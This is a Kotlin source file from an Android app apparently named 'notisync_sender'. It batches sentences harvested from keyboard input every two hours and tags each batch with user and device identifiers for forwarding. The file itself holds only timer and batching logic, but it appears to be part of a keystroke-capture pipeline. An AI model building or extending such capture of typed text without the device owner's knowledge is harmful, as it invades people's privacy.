// ============================================================
// FILE: service/keyboard/KeyboardBatchProcessor.kt
// Purpose: Collects sentences for 2 hours then emits a batch
// ============================================================

package com.app.notisync_sender.service.keyboard

import android.util.Log
import com.app.notisync_sender.domain.model.CapturedSentence
import com.app.notisync_sender.domain.model.SentenceBatch
import com.app.notisync_sender.domain.model.DeviceInfo
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.SharedFlow
import kotlinx.coroutines.flow.asSharedFlow
import kotlinx.coroutines.launch
import java.util.UUID
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class KeyboardBatchProcessor @Inject constructor(
    private val sentenceDetector: SentenceDetector
) {

    companion object {
        private const val TAG = "KeyboardBatchProcessor"
        const val BATCH_INTERVAL_MS = 2 * 60 * 60 * 1000L
    }

    private val _batchFlow = MutableSharedFlow<SentenceBatch>(
        replay = 0,
        extraBufferCapacity = 5
    )
    val batchFlow: SharedFlow<SentenceBatch> = _batchFlow.asSharedFlow()

    private val scope = CoroutineScope(Dispatchers.IO)
    private var timerJob: Job? = null
    private var isRunning = false
    private var currentUserId: String = ""
    private var currentDeviceInfo: DeviceInfo? = null

    fun configure(userId: String, deviceInfo: DeviceInfo) {
        currentUserId = userId
        currentDeviceInfo = deviceInfo
        Log.d(TAG, "Configured — userId=$userId, device=${deviceInfo.deviceName}")
    }

    fun startBatchTimer() {
        if (isRunning) {
            Log.d(TAG, "Batch timer already running")
            return
        }

        isRunning = true
        Log.d(TAG, "Starting keyboard batch timer — interval: ${BATCH_INTERVAL_MS / 1000 / 60} minutes")

        timerJob = scope.launch {
            while (true) {
                delay(BATCH_INTERVAL_MS)
                emitCurrentBatch()
            }
        }
    }

    fun stopBatchTimer() {
        Log.d(TAG, "Stopping keyboard batch timer")
        isRunning = false
        timerJob?.cancel()
        timerJob = null

        scope.launch {
            emitCurrentBatch()
        }
    }

    private suspend fun emitCurrentBatch() {
        val sentences = sentenceDetector.harvestSentences()

        if (sentences.isEmpty()) {
            Log.d(TAG, "No sentences to batch")
            return
        }

        val deviceInfo = currentDeviceInfo
        if (deviceInfo == null) {
            Log.w(TAG, "Device info not configured")
            return
        }

        val batch = SentenceBatch.create(
            userId = currentUserId,
            deviceId = deviceInfo.deviceId,
            deviceName = deviceInfo.deviceName,
            sentences = sentences
        )

        Log.d(TAG, "Emitting sentence batch: ${batch.sentences.size} sentences")
        _batchFlow.emit(batch)
    }

    fun getPendingCount(): Int {
        return sentenceDetector.getPendingCount()
    }
}